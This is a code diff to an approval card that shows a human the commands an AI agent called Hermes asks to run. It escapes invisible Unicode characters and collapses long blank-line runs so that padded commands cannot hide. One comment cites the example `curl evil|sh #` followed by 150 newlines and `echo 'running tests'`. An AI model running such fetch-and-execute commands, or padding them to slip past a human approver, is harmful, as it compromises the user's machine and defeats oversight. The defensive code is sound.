@@ -18,11 +18,51 @@ const ANSWERED_LABEL: Record<ApprovalChoice, string> = {
   deny: "Denied",
 };
 
-/** Unicode control and format characters, such as bidi overrides and zero-width spaces, except newline and tab. */
-const HIDDEN = /(?![\n\t])[\p{Cc}\p{Cf}]/gu;
+/**
+ * Characters that hide what runs: Unicode control and format characters, such as bidi overrides and zero-width spaces,
+ * except newline and tab; the line and paragraph separators, which break a line where none is; and letters that draw
+ * nothing (the Hangul fillers and the blank Braille pattern) (#489).
+ */
+const HIDDEN = /(?![\n\t])[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\u115F\u1160\u3164\uFFA0\u2800]/gu;
 
 /** Text from Hermes with its hidden characters written out, so what shows is what runs. */
 const visible = (text: string) => text.replace(HIDDEN, (c) => `\\u{${c.codePointAt(0)!.toString(16).toUpperCase()}}`);
+
+/** More blank lines than this in a row show as one marker saying how many, so they can't push a line out of sight. */
+const BLANK_RUN = 2;
+
+/**
+ * A command as the card shows it: its hidden characters written out, and each run of more than `BLANK_RUN` blank lines
+ * replaced by a marker, so `curl evil|sh #`, 150 newlines and then `echo "running tests"` reads as all three (#489).
+ */
+function CommandText({ command }: { command: string }) {
+  const lines = visible(command).split("\n");
+  const parts: ({ text: string } | { blank: number })[] = [];
+  for (let i = 0; i < lines.length; ) {
+    let end = i;
+    while (end < lines.length && !/\S/u.test(lines[end])) end++;
+    if (end - i > BLANK_RUN) {
+      parts.push({ blank: end - i });
+      i = end;
+    } else {
+      parts.push({ text: lines[i] });
+      i++;
+    }
+  }
+  return (
+    <>
+      <pre className="approval-cmd">
+        {parts.map((p, i) => (
+          <span key={i}>
+            {i > 0 && "\n"}
+            {"blank" in p ? <span className="approval-gap">{`[${p.blank} blank lines]`}</span> : p.text}
+          </span>
+        ))}
+      </pre>
+      {lines.length > 1 && <div className="approval-lines">{lines.length} lines</div>}
+    </>
+  );
+}
 
 /** How long buttons ignore clicks after they appear, so a click aimed at what was there before doesn't answer. */
 const ARM_MS = 400;
@@ -81,7 +121,7 @@ export function ApprovalCard({
         <ShieldAlert size={15} />
         {item.answer ? ANSWERED_LABEL[item.answer] : item.ended ? endedNote(item.ended) : "Hermes wants to run a command"}
       </div>
-      <pre className="approval-cmd">{visible(item.command)}</pre>
+      <CommandText command={item.command} />
       {!closed && (
         <>
           {item.description && <div className="approval-desc">{visible(item.description)}</div>}
